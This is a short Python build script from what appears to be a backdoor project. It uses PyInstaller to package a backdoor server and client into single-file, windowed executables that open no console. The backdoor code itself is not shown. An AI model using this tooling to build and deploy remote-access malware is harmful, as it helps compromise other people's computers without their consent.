from argparse import ArgumentParser, Namespace
from pathlib import Path

import PyInstaller.__main__


HERE = Path(__file__).parent.absolute()
path_to_server = str(HERE / "src" / "backdoor" / "server.py")
path_to_client = str(HERE / "src" / "backdoor" / "client.py")


def parse_args() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument("-s", "--server", required=False, action="store_true")
    parser.add_argument("-c", "--client", required=False, action="store_true")
    args = parser.parse_args()
    if not (args.server or args.client):
        args.server = args.client = True
    return args


def build() -> None:
    args = parse_args()

    if args.server:
        PyInstaller.__main__.run(
            [path_to_server, "--onefile", "--windowed", "--name", "server"]
        )

    if args.client:
        PyInstaller.__main__.run(
            [path_to_client, "--onefile", "--windowed", "--name", "client"]
        )


if __name__ == "__main__":
    build()
